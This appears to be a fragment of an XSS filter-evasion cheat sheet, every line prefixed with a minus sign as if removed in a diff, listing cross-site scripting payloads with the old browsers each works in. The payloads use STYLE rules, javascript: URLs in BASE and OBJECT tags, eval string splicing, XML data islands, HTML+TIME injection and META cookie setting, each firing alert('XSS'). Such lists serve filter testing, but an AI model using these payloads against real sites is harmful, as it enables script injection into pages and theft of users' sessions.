-[IE7.0|IE6.0|NS8.1-IE] 
-
-  
-<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
-[NS4]
-
-
-<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
-[IE6.0|NS8.1-IE]
-
-    
-<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
-[IE6.0|NS8.1-IE] 
-
-        
-<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
-[IE7.0|IE6.0|NS8.1-IE]
-
-
-<BASE HREF="javascript:alert('XSS');//">
-[IE6.0|NS8.1-IE]
-
-
-<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
-[O9.02]
-
-    
-a="get";b="URL(\"";c="javascript:";d="alert('XSS');\")";eval(a+b+c+d);
-[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02] 
-
-        
-<XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]></C></X><xml><SPAN DATASRC=#I DATAFLD=CDATAFORMATAS=HTML></SPAN>
-[IE6.0|NS8.1-IE]
-
-        
-<XML ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
-[IE6.0|NS8.1-IE]
-
-
-<XML SRC="xsstest.xml" ID=I></XML><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
-[IE6.0|NS8.1-IE]
-
-
-<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>
-[IE7.0|IE6.0|NS8.1-IE]
-
-    
-<? echo('<SCR)';echo('IPT>alert("XSS")</SCRIPT>'); ?>
-[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
-
-        
-<META HTTP-EQUIV="Set-Cookie" Content="USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;">
-[IE7.0|IE6.0|NS8.1-IE] [NS8.1-G|FF2.0] [O9.02]
